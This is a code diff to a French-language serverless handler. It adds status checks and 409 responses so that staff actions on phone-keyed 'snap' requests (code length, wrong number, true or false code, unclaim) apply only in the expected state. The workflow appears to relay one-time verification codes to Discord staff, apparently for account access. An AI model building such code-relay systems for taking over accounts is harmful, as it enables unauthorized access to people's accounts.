@@ -67,21 +67,38 @@ export default async function handler(req, res) {
                     message: "Longueur invalide — doit être 4 ou 6",
                 });
             }
-            await sql`
+            // Guard: only valid from 'processing' (just claimed) or 'retry_code'
+            // (after a false_code). Prevents a stale/duplicate Discord message
+            // from setting a length on a request that moved on or was reset.
+            const result = await sql`
                 UPDATE snap_requests
                 SET status = 'waiting_code', code_length = ${len}
-                WHERE phone = ${phone}
+                WHERE phone = ${phone} AND status IN ('processing', 'retry_code')
+                RETURNING id
             `;
+            if (result.length === 0) {
+                return res.status(409).json({
+                    success: false,
+                    message: "Cette demande n'est plus dans l'état attendu (déjà traitée ou réinitialisée).",
+                });
+            }
             return res.status(200).json({ success: true, message: `Longueur définie : ${len} chiffres` });
         }
 
         // ─── WRONG NUMBER ─────────────────────────────────────────────────────
         if (action === "wrong_number") {
-            await sql`
+            const result = await sql`
                 UPDATE snap_requests
                 SET status = 'wrong_number', claimed_by_discord_id = NULL
-                WHERE phone = ${phone}
+                WHERE phone = ${phone} AND status IN ('processing', 'retry_code')
+                RETURNING id
             `;
+            if (result.length === 0) {
+                return res.status(409).json({
+                    success: false,
+                    message: "Cette demande n'est plus dans l'état attendu (déjà traitée ou réinitialisée).",
+                });
+            }
             try {
                 await sql`
                     INSERT INTO snap_logs (action, details)
@@ -93,11 +110,18 @@ export default async function handler(req, res) {
 
         // ─── TRUE CODE ────────────────────────────────────────────────────────
         if (action === "true_code") {
-            await sql`
+            const result = await sql`
                 UPDATE snap_requests
                 SET status = 'completed', claimed_by_discord_id = NULL
-                WHERE phone = ${phone}
+                WHERE phone = ${phone} AND status = 'code_submitted'
+                RETURNING id
             `;
+            if (result.length === 0) {
+                return res.status(409).json({
+                    success: false,
+                    message: "Cette demande n'est plus dans l'état attendu (déjà traitée ou réinitialisée).",
+                });
+            }
             try {
                 await sql`
                     INSERT INTO snap_logs (action, details)
@@ -110,11 +134,18 @@ export default async function handler(req, res) {
         // ─── FALSE CODE ───────────────────────────────────────────────────────
         if (action === "false_code") {
             // Keep claimed_by_discord_id — same staff member handles the retry
-            await sql`
+            const result = await sql`
                 UPDATE snap_requests
                 SET status = 'retry_code'
-                WHERE phone = ${phone}
+                WHERE phone = ${phone} AND status = 'code_submitted'
+                RETURNING id
             `;
+            if (result.length === 0) {
+                return res.status(409).json({
+                    success: false,
+                    message: "Cette demande n'est plus dans l'état attendu (déjà traitée ou réinitialisée).",
+                });
+            }
             try {
                 await sql`
                     INSERT INTO snap_logs (action, details)
@@ -126,11 +157,18 @@ export default async function handler(req, res) {
 
         // ─── UNCLAIM ──────────────────────────────────────────────────────────
         if (action === "unclaim") {
-            await sql`
+            const result = await sql`
                 UPDATE snap_requests
                 SET status = 'pending', claimed_by_discord_id = NULL
-                WHERE phone = ${phone}
+                WHERE phone = ${phone} AND status IN ('processing', 'retry_code')
+                RETURNING id
             `;
+            if (result.length === 0) {
+                return res.status(409).json({
+                    success: false,
+                    message: "Cette demande n'est plus dans l'état attendu (déjà traitée ou réinitialisée).",
+                });
+            }
             try {
                 await sql`
                     INSERT INTO snap_logs (action, details)
